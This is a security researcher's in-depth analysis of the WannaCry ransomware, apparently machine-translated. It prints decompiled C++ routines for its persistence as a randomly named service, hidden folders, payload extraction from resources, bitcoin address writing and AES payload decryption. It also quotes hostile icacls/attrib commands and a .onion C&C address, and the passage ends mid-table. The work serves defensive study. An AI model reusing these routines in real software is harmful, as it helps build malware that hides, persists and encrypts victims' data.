# Wannacry in-depth analysis #

The WannaCry ransomware attack is an ongoing worldwide cyberattack by the WannaCry ransomware cryptoworm, which targets computers running the Microsoft Windows operating system by encrypting data and demanding ransom payments in the Bitcoin cryptocurrency.

The attack started on Friday, 12 May 2017, and within a day was reported to have infected more than 230,000 computers in over 150 countries. Parts of Britain's National Health Service (NHS), Spain's Telefónica, FedEx and Deutsche Bahn were hit, along with many other countries and companies worldwide.

As a security industry worker, I conducted a deep analysis of WannaCry. A complete analysis can help security industry workers understand hackers' latest attacks, provide valuable information for solutions in the field of protection, and try to find software vulnerabilities to provide valuable data recovery services to customers.

Here I will start a comprehensive review of the results of my two days of analysis.

I had an in-depth analysis of CryptXXX, Cerber, and Locky's high-calorie ransomware, and Wannacry had learned the experience of extrapolating software before evolving and escalating a two-stage attack. What is a two-stage attack? In short, the malicious program itself does not attack behavior, such as Wannacry program itself does not do data encryption work, it will really have the code of the dynamic release that has encryption behavior hidden in the release of the code. It sounds like shell-like behavior, such as Locky is a shell with ransomware, it will run up through the shell code to release malicious code. But the shell code itself is also a very obvious feature, such as overweight code can not be disassembled, and under normal circumstances the information entropy is very high, many protection software will improve the risk level of this program, the user once encountered, or this Once the program drops to the user's machine will be detected to. But Wannacry is different, its first-stage program does not have any shell code at all, EntryPoint does not do any customization, there is no trace of any thought that change, maybe this is also Wannacry will be used in large-scale use of Microsoft vulnerabilities to be transmitted on Endpoint.

About other Ransomware in-depth analysis please refer to my blog:
[http://www.tedzhang.online/wordpress/index.php/2016/08/07/ransomware-locky-analysis/](http://www.tedzhang.online/wordpress/index.php/2016/08/07/ransomware-locky-analysis/)
[http://www.tedzhang.online/wordpress/index.php/2016/07/15/cerber-analysis/](http://www.tedzhang.online/wordpress/index.php/2016/07/15/cerber-analysis/)
[http://www.tedzhang.online/wordpress/index.php/2016/07/15/cryptxxx-analysis/](http://www.tedzhang.online/wordpress/index.php/2016/07/15/cryptxxx-analysis/)

**Hack Weapon**

Before starting the analysis, would like to talk about the concept of Hack Weapon, according to the analysis of many professional bodies, this black industry chain has been developed very mature. In the deep network, you can buy a variety of attack components to form a valid attack entity; for example, there are zeroday holes, there are loaders, encryption module, then I can according to my needs to buy the right module, And then assembled into a truly malicious program. Which is the module Hack Weapon, we collected a lot of Sample is a combination of many modules, then we through the in-depth analysis of the in-depth found a malicious software, there are a variety of attack weapons when these attacks can be Weapon Extraction, The establishment of a separate arsenal and these Hack Weapon feature modeling, behavior modeling to improve our security products? 

From a technical point of view, the multiplexing of the Machine Instruction level is absolutely consistent, because there is no recompile, so there will be no inconsistency due to the compiler version or option.

Hacker weapons providers, should not provide the source code, but the weapons as a binary provided to the downstream hackers, so the establishment of this arsenal, providing a very strong character. And from the perspective of weapons to match malicious programs with more accurate ability to identify, for example, I think a hidden Peloader module is a kind of malware, then for this Weapon character or behavior modeling will be more targeted for the use of This Weapon all the malware, will be the security protection software has the ability to combat more.

I have extracted a Hack Weapon for the process of String encryption, then I did not think the software will have a modular design, until another malicious software to see the same Behavior, and the extraction of the entire function of the flow even Instruction are completely consistent.

This time in the analysis process, I have at least been able to identify two kinds of Hack Weapon: PeLoader and Resource Extractor, the former used to load a PE file into memory, and do not call the Microsoft API (not accurate, very few calls, because The allocation of memory also need to call VirtualAlloc) circumstances to solve the Import Table, Base Relocation and other super troublesome things, so that the use of Monitor and other procedures are not found he has a LoadDll behavior; the latter used to extract from the Resource an encrypted Attack with the PE payload, the two modules are very sophisticated. I think that even if the author does not re-write the idea, which requires a lot of careful coding and a lot of testing, because a little negligence will lead to the final attack fall short (referring to the load Payload failure).

At the end of this analysis, I will extract the two Hack Weapon and write a POC code to reuse the two components.

## phase one ##

**tasksche** 

Wannacry's main program will be changed to **tasksche.exe**, from the name of the purpose is to confuse the user. Here we come together to analyze this procedure, starting from the WinMain function.

> In order to easily explain the behavior of the program, the following code snippet will be used to express all the C + + language, unless the encounter C ++ expression confusion or compiler optimization and other reasons C + + can not express the case, will use assembly language and a detailed description.

```C++
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  char **argv; 
  void *lpPEFile; 
  CPeBuilder *pPeBuilder; 
  void (__stdcall *fpTaskStart)(_DWORD, _DWORD); 
  CProgram Program; 
  char szModuleFileName[520]; 
  int nFileSize; 

  szModuleFileName[0] = szSelfName;
  memset(&szModuleFileName[1], 0, 516u);
  *&szModuleFileName[517] = 0;
  szModuleFileName[519] = 0;
  GetModuleFileNameA(0, szModuleFileName, 520u);
  CreateRandomSequence(szServiceName);
  if ( *_p___argc() != 2
    || (argv = _p___argv(), strcmp(*(*argv + 1), aI))
    || !CreateHiddenData(0)
    || (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
    || !StartMalware() )
  {
    if ( strrchr(szModuleFileName, '\\') )
      *strrchr(szModuleFileName, '\\') = 0;
    SetCurrentDirectoryA(szModuleFileName);
    WriteRegistery(1);
    ExtractFromResource(0, WNcry);
    ModifyOneByte();
    StartProcess(CommandLine, 0, 0);            // attrib +h : Sets the hidden file attribute.
    StartProcess(aIcacls_GrantEv, 0, 0);
    if ( InitKernel32Funcs() )
    {
      CProgram::ctor(&Program);
      if ( CProgram::Initialize(&Program, 0, 0, 0) )
      {
        nFileSize = 0;
        lpPEFile = CProgram::GetPeFile(&Program, aT_wnry, &nFileSize);
        if ( lpPEFile )
        {
          pPeBuilder = WncryLoadPE(lpPEFile, nFileSize);
          if ( pPeBuilder )
          {
            fpTaskStart = WncrySeek2TaskStart(pPeBuilder, szTaskStart);
            if ( fpTaskStart )
              fpTaskStart(0, 0);
          }
        }
      }
      CProgram::dtor_0(&Program);
    }
  }
  return 0;
}
```

WinMain code is easy to understand, declare a few variables, which CProgram object, CPeBuilder pointer, and fpTaskStart WinMain is the key to the operation, WinMain is the purpose of dynamically loading a Pe dll to memory and run up, the whole process to do quite The concealment. The WinMain function declares a 520 byte array on the stack to get the full path to the current process. The program will use this path to copy the file and name it tasks.exe and call StartMalware to start itself.

Here Malware has been through the zeroday holes into the Endpoint and was launched, I think there is a common phase, I define this stage as **hidden stage**. What is the hidden stage, in other words Malware at this stage is not the first to do the implementation of the attack code, but in the implementation of the attack before the first to hide their whereabouts, camouflage himself as a seemingly normal procedure, and in the future log investigation Confuse the analyst.

```C++
if ( *_p___argc() != 2
|| (argv = _p___argv(), strcmp(*(*argv + 1), aI))
|| !CreateHiddenData(0)
|| (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
|| !StartMalware() )
```

Take a closer look at this code, Wannacry started the first time after a few key operations:

- Check the startup parameters
- create hidden data (folder)
- Rename to tasksche.exe
- Start yourself again

Check the start parameters and rename can be directly from the expression to judge out, not complicated.

**create hidden data (folder)**

```C++
int __cdecl CreateHiddenData(wchar_t *p)
{
  int result; 
  __int16 wszWindowsPath[260]; 
  __int16 wszProgramData[260];
  __int16 wszServiceName[100];

  wszWindowsPath[0] = g_ComputerName;
  memset(&wszWindowsPath[1], 0, 516u);
  wszWindowsPath[259] = 0;
  wszProgramData[0] = g_ComputerName;
  memset(&wszProgramData[1], 0, 516u);
  wszProgramData[259] = 0;
  wszServiceName[0] = g_ComputerName;
  memset(&wszServiceName[1], 0, 196u);
  wszServiceName[99] = 0;
  MultiByteToWideChar(0, 0, szServiceName, -1, wszServiceName, 99);
  GetWindowsDirectoryW(wszWindowsPath, 260u);
  wszWindowsPath[2] = 0;
  swprintf(wszProgramData, aSProgramdata, wszWindowsPath);
  if ( GetFileAttributesW(wszProgramData) != INVALID_FILE_ATTRIBUTES && CreateFolder(wszProgramData, wszServiceName, p)
    || (swprintf(wszProgramData, aSIntel, wszWindowsPath), CreateFolder(wszProgramData, wszServiceName, p))
    || CreateFolder(wszWindowsPath, wszServiceName, p) )
  {
    result = 1;
  }
  else
  {
    GetTempPathW(260u, wszProgramData);
    if ( wcsrchr(wszProgramData, '\\') )
      *wcsrchr(wszProgramData, '\\') = 0;
    result = CreateFolder(wszProgramData, wszServiceName, p) != 0;
  }
  return result;
}
```

The above function eventually created **%WinDir%\ProgramData,%WinDir%\Intel** two folders and set their properties to Hidden.

```C++
int __cdecl CreateFolder(LPCWSTR lpPathName, LPCWSTR lpFileName, wchar_t *String)
{
  int result; 
  DWORD fac; 

  CreateDirectoryW(lpPathName, 0);
  if ( SetCurrentDirectoryW(lpPathName) && (CreateDirectoryW(lpFileName, 0), SetCurrentDirectoryW(lpFileName)) )
  {
    fac = GetFileAttributesW(lpFileName);
    LOBYTE(fac) = fac | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN;  <<==== Note here.
    SetFileAttributesW(lpFileName, fac);
    if ( String )
      swprintf(String, aSS, lpPathName, lpFileName);
    result = 1;
  }
  else
  {
    result = 0;
  }
  return result;
}
```

The above is the CreateFolder code, it is easy to understand, mainly through the creation of this function Folder set Hidden property.

**Restart Again**

```C++
BOOL StartMalware()
{
  char szFullPath[520];

  szFullPath[0] = szSelfName;
  memset(&szFullPath[1], 0, 516u);
  *&szFullPath[517] = 0;
  szFullPath[519] = 0;
  GetFullPathNameA(FileName, 520u, szFullPath, 0);
  return StartService(szFullPath) && WaitMutex4Times(60) || StartProcess(szFullPath, 0, 0) && WaitMutex4Times(60);
}
```

Note that the last line of code, Wannacry will use two kinds of ways to start their own, first try to disguise themselves as a service program, if the failure, try the general process of the way.

*service method*

When starting with a service, Wannacry first takes advantage of a random sequence that is initialized in WinMain as the service name. Here is the code that generates the random sequence:

```C++
int __cdecl CreateRandomSequence(char *displayname)
{
  unsigned int nSeed; 
  int pBuffer; 
  size_t nLen; 
  int index;
  int v5;
  int v6; 
  int result; 
  __int16 Buffer[200]; 
  DWORD nSize; 
  unsigned int i; 

  Buffer[0] = g_ComputerName;
  nSize = 399;
  memset(&Buffer[1], 0, 396u);
  Buffer[199] = 0;
  GetComputerNameW(Buffer, &nSize);
  i = 0;
  nSeed = 1;
  if ( wcslen(Buffer) )
  {
    pBuffer = Buffer;
    do
    {
      nSeed *= *pBuffer;
      ++i;
      pBuffer += 2;
      nLen = wcslen(Buffer);
    }
    while ( i < nLen );
  }
  srand(nSeed);
  index = 0;
  v5 = rand() % 8 + 8;
  if ( v5 > 0 )
  {
    do
      displayname[index++] = rand() % 26 + 'a';
    while ( index < v5 );
  }
  v6 = v5 + 3;
  while ( index < v6 )
    displayname[index++] = rand() % 10 + '0';
  result = displayname;
  displayname[index] = 0;
  return result;
}
```

This code takes advantage of the user's computer name. By multiplying each of the computer names by itself, a seed value of the initializer is initialized and a random number generator is used to generate a random service name. This random service name consists of 'a-z''0-9'.

```C++
signed int __cdecl StartService(char *pFullpath)
{
  signed int result; 
  SC_HANDLE hSCService; 
  char lpBinaryPathName; 
  SC_HANDLE hSCObject; 
  int nRet; 
  SC_HANDLE hSCManager; 

  nRet = 0;
  hSCManager = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS);
  if ( hSCManager )
  {
    hSCObject = OpenServiceA(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
    if ( hSCObject )
    {
      StartServiceA(hSCObject, 0, 0);
      CloseServiceHandle(hSCObject);
      result = 1;
    }
    else
    {
      sprintf(&lpBinaryPathName, Format, pFullpath);// cmd.exe /c "%s"
      hSCService = CreateServiceA(
                     hSCManager,
                     szServiceName,
                     szServiceName,
                     SERVICE_ALL_ACCESS,
                     SERVICE_WIN32_OWN_PROCESS,
                     SERVICE_AUTO_START,
                     SERVICE_ERROR_NORMAL,
                     &lpBinaryPathName,
                     0,
                     0,
                     0,
                     0,
                     0);
      if ( hSCService )
      {
        StartServiceA(hSCService, 0, 0);
        CloseServiceHandle(hSCService);
        nRet = 1;
      }
      result = nRet;
    }
    CloseServiceHandle(hSCManager);
  }
  else
  {
    result = 0;
  }
  return result;
}
```

Wannacry uses the StartService function to start itself as a service with a random service name, which is the easiest way to conceal it. But if there is no permission to operate the service manager, or accidentally failed, Wannacry also has a regular startup method as an alternative.

```C++
int __cdecl StartProcess(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)
{
  int result; 
  struct _STARTUPINFOA StartupInfo;
  struct _PROCESS_INFORMATION ProcessInformation; 

  StartupInfo.cb = 0x44;
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  ProcessInformation.hProcess = 0;
  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  ProcessInformation.dwThreadId = 0;
  StartupInfo.wShowWindow = 0;
  StartupInfo.dwFlags = 1;
  if ( CreateProcessA(0, lpCommandLine, 0, 0, 0, CREATE_NO_WINDOW, 0, 0, &StartupInfo, &ProcessInformation) )  <<=== Note here 
  {
    if ( dwMilliseconds )
    {
      if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )
        TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF);
      if ( lpExitCode )
        GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode);
    }
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
    result = 1;
  }
  else
  {
    result = 0;
  }
  return result;
}
```

StartProcess function as an alternative to use a regular way to start a process, where the incoming CommandLine is already changed the name of the program for the taskche.exe path, at least with the name of this also has some confusion, and a small detail, set the non Window mode.


```C++
signed int __cdecl WaitMutex4Times(int param)
{
  int nCount; 
  HANDLE hMutex; 
  signed int result; 
  char szMutexName[100]; 

  sprintf(szMutexName, aSD, aGlobalMswinzon, 0);// Global\MsWinZonesCacheCounterMutexA
  nCount = 0;
  if ( param <= 0 )
  {
END:
    result = 0;
  }
  else
  {
    while ( 1 )
    {
      hMutex = OpenMutexA(SYNCHRONIZE, 1, szMutexName);// The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.
      if ( hMutex )
        break;
      Sleep(1000u);
      ++nCount;
      if ( nCount >= param )
        goto END;
    }
    CloseHandle(hMutex);
    result = 1;
  }
  return result;
}
```

Whichever way you start yourself again, the program calls the above function to wait **Global \ MsWinZonesCacheCounterMutexA0** This system Mutex, and then try to wait 60 times, each time for 1 second, for a total of 60 seconds. It seems that the Named Mutex object should be in the attack module, which is a conventional assumption.

Of course, if the above methods have failed, Wannacry will not give up this only one chance to encrypt the user's data, since hidden not, then do it directly. And directly dry this part of the code and hidden after the code is the same, just merge analysis. Before you start there are some things to do:

```C++
WriteRegistry(1);
ExtractFromResource(0, WNcry);
SetBitcoinAddress();
StartProcess(CommandLine, 0, 0);            // attrib +h : Sets the hidden file attribute.
StartProcess(aIcacls_GrantEv, 0, 0);		// icacls . /grant Everyone:F /T /C /Q
if ( InitKernel32Funcs() )
```

- Write the registry
- Extract Payload
- Write Bitcoin wallet address to c.wnry
- hide the current working directory
- Full access to the current directory authorizations owner
- Initialize system calls

This is hidden inside the working directory, mention, and initialize the system call are nothing to say, the remaining few operations, the most difficult is ExtractFromResource, which release Payload from the resource segment. 

**Write the registry**

```C++
signed int __cdecl WriteRegistry(int flag)
{
  size_t nlen; 
  LSTATUS nStatus; 
  LSTATUS nRet; 
  char szDirPath[520]; 
  wchar_t szSoftware[100]; 
  DWORD cbData; 
  int nCount; 
  HKEY phkResult; 

  qmemcpy(szSoftware, aSoftware, 0x14u);
  szDirPath[0] = 0;
  phkResult = 0;
  memset(&szSoftware[10], 0, 180u);
  memset(&szDirPath[1], 0, 516u);
  *(_WORD *)&szDirPath[517] = 0;
  szDirPath[519] = 0;
  wcscat(szSoftware, Source);                   // Software\WanaCrypt0r
  nCount = 0;
  while ( 1 )
  {
    if ( nCount )
      RegCreateKeyW(HKEY_CURRENT_USER, szSoftware, &phkResult);
    else
      RegCreateKeyW(HKEY_LOCAL_MACHINE, szSoftware, &phkResult);
    if ( phkResult )
    {
      if ( flag )
      {
        GetCurrentDirectoryA(519u, szDirPath);
        nlen = strlen(szDirPath);
        nStatus = RegSetValueExA(phkResult, ValueName, 0, 1u, (const BYTE *)szDirPath, nlen + 1) == 0;// wd
      }
      else
      {
        cbData = 519;
        nRet = RegQueryValueExA(phkResult, ValueName, 0, 0, (LPBYTE)szDirPath, &cbData);
        nStatus = nRet == ERROR_SUCCESS;
        if ( !nRet )
          SetCurrentDirectoryA(szDirPath);
      }
      RegCloseKey(phkResult);
      if ( nStatus )
        break;
    }
    ++nCount;
    if ( nCount >= 2 )
      return 0;
  }
  return 1;
}
```

Wannacry uses WriteRegistryFunc to create a "wd" key under "HKLM\Software\WanaCrypt0r" and "HKCU\Software\WanaCrypt0r" and write it to the current working directory. Let's assume that it is done to prevent it from encrypting itself.

    WINDBG>du 0012f71c
    0012f71c  "Software\WanaCrypt0r"

![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/picture/WriteRegistry.png)

**Extract Payload**

The logic of the procedure mentioned earlier is very simple, starting from here began to interesting, and analyze the code is still very difficult, but also very interesting. First look at the implementation of Payload Extractor.

Wannacry in their own res segment stored in a lot of encrypted Data, there are a lot of malicious programs, in order to understand what they are doing, we need to understand its memory layout.

The extraction function first loads the resource data into memory:

```C++
hRes = FindResourceA(hModule, (LPCSTR)'\b\n', aXIA);
if ( hRes
    && (pResourceByte = LoadResource(hModule, hRes)) != 0
    && (pResource = LockResource(pResourceByte)) != 0
    && (nSize = SizeofResource(hModule, hRes), (pWnResult = StartVersion(pResource, nSize, WNcry@2ol7)) != 0) )
```

![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/picture/ResourcePayload.png)

After the call StartVersion function to initialize a CResource object, the object will load out of the Resource data loaded into the reason why the use of this function name, it has other versions of the loading method, one version is through a file handle to load Payload , Which means that the Payload Extractor also supports extracting Payload from the file.

```C++
struct CResource
{
  CWnBigResData *pWnData;
  int bflag1;
  char pBuffer[300];
  int bflag2;
  char *pSignture;
  void *pSomeThing;
  char szCurrentDir[260];
};
```

CResource As shown in the above structure, there are some data so far I do not know what to do, but the most important data structure is a data structure called CWnBigResData, the data structure of the former 0x20 is CWnResData it contains some of Payload Important information. In addition pSignture is a feature of this object here is the incoming data "**WNcry @ 20l7**".


```C++
CWnResult *__cdecl StartVersion3(HANDLE hRes, int nSize, int version, char *WNcry@2ol7)
{
  CResource *p; 
  CResource *pRes; 
  CWnResult *result; 

  p = operator new(0x244u);
  if ( p )
    pRes = CResource::ctor(p, WNcry@2ol7);
  else
    pRes = 0;
  g_StatusCode = CResource::Initialize(pRes, hRes, nSize, version);
  if ( g_StatusCode )
  {
    if ( pRes )
    {
      CResource::dtor(pRes);
      operator delete(pRes);
    }
    result = 0;
  }
  else
  {
    result = operator new(8u);
    result->bLoadSuccess = 1;
    result->pResource = pRes;
  }
  return result;
}
```

StartVersion3 is called by StartVersion, and passed 3 to the version of this parameter, because the role of this parameter, the program will read from the Memory Payload rather than the file handle. This function creates the CResource object and calls its Initialize method to initialize it. The result of initializing Payload is recorded in the global variable g_StatusCode. If the initialization fails, it will be destructed and exited, and the program will not succeed. If the success will create a CResult object, the object has two data members, bLoadSuccess used to indicate the success of the initialization, pResource pointer to the CResource object.

```C++
pWnResData->bIsFile = 0;
pWnResData->lpResourceData = lpResourceData;
pWnResData->dwPos = 1;
LOBYTE(pWnResData->bIsFileHandle) = 0;
pWnResData->nResourceSize = nSize;
pWnResData->nCurrentOffsetPos = 0;
pWnResData->nOffsetInBuffer = 0;
```

The above code snippet is the behavior of the version parameter equal to 3, there are two important data pWnResData->lpResourceData is assigned to the pointer to the resource segment, pWnResData->nResourceSize is the size of the resource segment.

The most important function, from GetDataFromResource, this method really loads data from the Resource into the memory data structure.

```C++
struct CWnResData
{
  char bIsFile; 
  char dwPos;
  char field_2;
  char field_3;
  HANDLE hFile;
  int field_8;
  int nOffsetInBuffer;
  int bIsFileHandle;
  LPCSTR lpResourceData;
  int nResourceSize;
  int nCurrentOffsetPos;
};
```

**The interesting thing here is that the load for ResourceData is read from behind, which is the way to read from the memory to the conventional low-to-high read, and it is true that the author is doing it well.**

	34:961Fh: 50 4B 05 06 00 00 00 00 24 00 24 00 D8 0D 00 00  PK......$.$.Ø... 
	34:962Fh: 47 88 34 00 00 00                                Gˆ4...

The above data is the last 22 bytes of the raw data I extracted from the Resource. By analyzing the last 22 bytes, I will show how the program interprets the data format of this custom protocol.

```C++
signed int __cdecl FindPkSignPosition(CWnResData *pResData)
{
  DWORD nSize; 
  int nBufferSize; 
  char *pBuffer; 
  signed int result; 
  signed int nHeadSize; 
  int nAllSize; 
  int index; 
  DWORD nTotalSize; 
  signed int nPKPos; 
  unsigned int nDataSize; 
  signed int nBlockSize; 

  if ( ResetCurrentOffset(pResData, 0, 2) )
    goto LABEL_27;
  nSize = GetResourceDataSize(pResData);
  nTotalSize = nSize;
  nBlockSize = 65535;
  if ( nSize < 65535 )
    nBlockSize = nSize;
  nBufferSize = 1028;
  pBuffer = malloc(1028u);
  if ( pBuffer )
  {
    nPKPos = -1;
    nHeadSize = 4;
    if ( nBlockSize > 4 )
    {
      while ( 1 )
      {
        nAllSize = nHeadSize + 1024;
        nDataSize = nBlockSize;
        if ( nAllSize <= nBlockSize )
          nDataSize = nAllSize;
        if ( nTotalSize - (nTotalSize - nDataSize) <= 1028 )
          nBufferSize = nTotalSize - (nTotalSize - nDataSize);
        if ( ResetCurrentOffset(pResData, nTotalSize - nDataSize, 0)
          || WncryReadData(pBuffer, nBufferSize, 1, pResData) != 1 )
          break;
        index = nBufferSize - 3;
        while ( 1 )
        {
          --index;
          if ( index < 0 )
            break;
          if ( pBuffer[index] == 'P' && pBuffer[index + 1] == 'K' && pBuffer[index + 2] == 5 && pBuffer[index + 3] == 6 )
          {
            nPKPos = nTotalSize - nDataSize + index;
            break;
          }
        }
        if ( nPKPos )
          break;
        if ( nDataSize >= nBlockSize )
          break;
        nHeadSize = nDataSize;
        nBufferSize = 1028;
      }
    }
    free(pBuffer);
    result = nPKPos;
  }
  else
  {
LABEL_27:
    result = -1;
  }
  return result;
}
```

The FindPkSignPosition function is used to point the pResourceBuffer to the last token of the **PK0506**. There are two ResetCurrentOffset functions in the above function. first to call ResetCurrentOffset the last argument is 2, and second the last argument is 0. 2 indicates that the current position of the pointer is the end of the buffer, 0 indicates that the absolute position. So the first call, the pointer will move the location of the end of the Buffer, the second call when the pointer has been pointing to the end of Buffer, Offset's offset is equal to a block size of 1028 themselves. So after these two operations, the pointer is actually equal to 1028 bytes forward from the end of the Buffer, so the current position of the pointer is equal to the total size of the Buffer minus the size of a Block.

	pBuffer = pBuffer + nTotalSize - nBlock

After positioning the pointer, the program reads a block size of the data into the BlockBuffer.

```C++
if ( pBuffer[index] == 'P' && pBuffer[index + 1] == 'K' && pBuffer[index + 2] == 5 && pBuffer[index + 3] == 6 )
```

Note that this code snippet, the program began to search from the last byte of the block 'PK56' this special tag value. It will always read until I read the data snippet posted above.

Observe the above data, the program will continue to read, write these data into the memory data structure, there are two kinds of reading methods, read 2 bytes at a time and read 4 bytes at a time. For the data I have listed, the data structure is as follows:

	Magic: 504B0506
	Reserved1: 0
	Reserved2: 0
	Unknown1: 24
	Unknown1: 24
	Current segment offset: 00000dd8
	The absolute position of the previous segment: 00348847

Where the absolute position of the previous segment plus the offset at the front end is equal to the absolute position of the current segment. If you try to add the two values, you will find the current position of the data above equal to absolute position, so we can use this method. Constantly positioning to the previous section, has been traversed to the beginning of the Memory.

Because Payload Extractor code is very much, it needs to extract all the data in the section, and by writing the file method to drop it, so do not continue to analyze here, if interested, through my inspiration should be able to try their own The analysis code extracts all the data.

> PS. We have seen in the process of running c.wnry u.wnry and so are droped at this stage.

<table>
    <tr>
        <th>DropFile</th>
        <th>Category</th>
		<th>Usage</th>
		<th>Data</th>
    </tr>
	<tr>
        <th>c.wnry</th>
        <th>Text</th>
		<th>C&C Server; Bitcoin address</th>
		<th>
			gx7ekbenv2riucmf.onion;
			https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip
		</th>
    </tr>
	<tr>
        <th>r.wnry</th>
        <th>Text</th>
		<th>Q & A</th>
		<th>Q:  What's wrong with my files?</th>
    </tr>
	<tr>
        <th>s.wnry</th>
        <th>PK Format</th>
		<th></th>
		<th>None</th>
    </tr>
	<tr>
        <th>t.wnry</th>
        <th>EncryptFile</th>
		<th>Attack Payload</th>
		<th>None</th>
    </tr>
	<tr>
        <th>u.wnry</th>
        <th>PE</th>
		<th>UI Interface</th>
		<th>Wana Decrypt0r 2.0</th>
    </tr>
</table>



**Bitcoin Address**

This process is relatively simple, first there are three bitcoin wallet address, randomly selected one, write the first 178 bytes of the start of the first 35 bytes, and then write the buffer to c.wnry.

```C++
int SetBitcoinAddress()
{
  int result;
  int iRandom; 
  char DstBuf[780]; 
  char *bitcoin1; 
  char *bitcoin2;
  char *bitcoin3; 

  bitcoin1 = a13am4vw2dhxygx;
  bitcoin2 = a12t9ydpgwuez9n;
  bitcoin3 = a115p7ummngoj1p;
  result = RWBuffer(DstBuf, 1);
  if ( result )
  {
    iRandom = rand();
    strcpy(&DstBuf[178], (&bitcoin1)[4 * (iRandom % 3)]);
    result = RWBuffer(DstBuf, 0);
  }
  return result;
}
```

**PeLoader**

Here Payload has also been successfully extracted, and that we said before Wannacry is a two-stage attack, the first stage there is a most important task is to encrypt the program quietly loaded up. Now to the exciting moment, through the next analysis, we can grasp the operating principle of PeLoader. As the most important Weapon for the second-stage attack, Peloader will ignore the Microsoft API to complete the dynamic loading of Pe dll.

If you do not want to turn to the top to see, then there is a code snippet:

```C++
CProgram::ctor(&Program);
if ( CProgram::Initialize(&Program, 0, 0, 0) )
{
nFileSize = 0;
lpPEFile = CProgram::GetPeFile(&Program, aT_wnry, &nFileSize);
if ( lpPEFile )
{
  pPeBuilder = WncryLoadPE(lpPEFile, nFileSize);
  if ( pPeBuilder )
  {
    fpTaskStart = WncrySeek2TaskStart(pPeBuilder, szTaskStart);
    if ( fpTaskStart )
      fpTaskStart(0, 0);
  }
}
}
CProgram::dtor_0(&Program);
```

There are two more data structures inside CProgram and CPeBuilder, first look at CProgram:

```C++
class CProgram
{
  void *vtable;
  CWnCryptContext pWnCryptContext1;
  CWnCryptContext pWnCryptContext2;
  CWnAES AES;
  LPCSTR *lpBuffer1M_1;
  LPCSTR *lpBuffer1M_2;
  int lpBufferUsed_2;
  int lpBufferUsed_1;
};
```

```C++
struct CWnCryptContext
{
  void *vtable;
  HCRYPTPROV phProv;
  HCRYPTKEY hKey1;
  HCRYPTKEY hKey2;
  CRITICAL_SECTION CriticalSection;
};
```

The program first constructs a CProgram object and initializes the internal CWnCryptContext with the CWnAES member, where Microsoft's CWnCryptContext uses a CSP that is the "Microsoft Enhanced RSA and AES Cryptographic Provider" algorithm, that is RSA and the RSA secret key is read from the program's data segment The

```C++
void *__thiscall CProgram::GetPeFile(CProgram *this, LPCSTR lpFileName, int *nRet)
{
  int pRbuff; 
  HANDLE hFile; 
  size_t Size; 
  int blank; 
  char lpBuffer[8] = {0}; 
  __int64 dwFileSize; 
  char lpPlaintext; 
  DWORD nRetSize; 
  int pBuffer; 
  LARGE_INTEGER FileSize; 
  int lpNumberOfBytesRead; 
  CPPEH_RECORD ms_exc; 

  pRbuff = 0;
  nRetSize = 0;
  Size = 0;
  blank = 0;
  lpNumberOfBytesRead = 0;
  ms_exc.registration.TryLevel = 0;
  hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);// t.wnry
  if ( hFile != INVALID_HANDLE_VALUE )
  {
    GetFileSizeEx(hFile, &FileSize);
    if ( FileSize.QuadPart <= 0x6400000 )       // 100 MB
    {
      if ( fpReadFile(hFile, lpBuffer, 8, &lpNumberOfBytesRead, 0) )
      {
        if ( !memcmp(lpBuffer, aWanacry, 8u) )  // WANACRY!
        {
          if ( fpReadFile(hFile, &Size, 4, &lpNumberOfBytesRead, 0) )
          {
            if ( Size == 0x100 )
            {
              if ( fpReadFile(hFile, this->lpBuffer1M_1, 0x100, &lpNumberOfBytesRead, 0) )
              {
                if ( fpReadFile(hFile, &blank, 4, &lpNumberOfBytesRead, 0) )
                {
                  if ( fpReadFile(hFile, &dwFileSize, 8, &lpNumberOfBytesRead, 0) )
                  {
                    if ( dwFileSize <= 0x6400000 )// 100 MB
                    {
                      if ( CWnCryptContext::DecryptData(
                             &this->pWnCryptContext1,
                             this->lpBuffer1M_1,
                             Size,
                             &lpPlaintext,
                             &nRetSize) )
                      {
                        AES_InitKey(&this->AES, &lpPlaintext, gBuffer, nRetSize, 16u);
                        pBuffer = GlobalAlloc(0, dwFileSize);
                        if ( pBuffer )
                        {
                          if ( fpReadFile(hFile, this->lpBuffer1M_1, FileSize.s.LowPart, &lpNumberOfBytesRead, 0)
                            && lpNumberOfBytesRead
                            && (SHIDWORD(dwFileSize) < 0
                             || SHIDWORD(dwFileSize) <= 0 && lpNumberOfBytesRead >= dwFileSize) )
                          {
                            pRbuff = pBuffer;
                            AES_Decrypt(&this->AES, this->lpBuffer1M_1, pBuffer, lpNumberOfBytesRead, 1);
                            *nRet = dwFileSize;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  local_unwind2(&ms_exc.registration, -1);
  return pRbuff;
}
```

The above CProgram::GetPeFile function uses the PublicKey in the program data segment to decrypt a piece of data in t.wnry, which decrypts the AES initialization vector and then uses it to initialize the AES encryption key, the program continues reading With the AESKey encrypted PE file to read into memory, and with the initial AESKey to decrypt, this function returns a PE file in memory, then turn to PeBuilder play.

Through this part, we can understand the encrypted structure of an encrypted file, through the above mention the two-stage attack analysis, I found that even the user is encrypted file encryption format is consistent with this file.

<table>
    <tr>
        <th>Offset</th>
        <th>Summary</th>
		<th>Data</th>
    </tr>
	<tr>
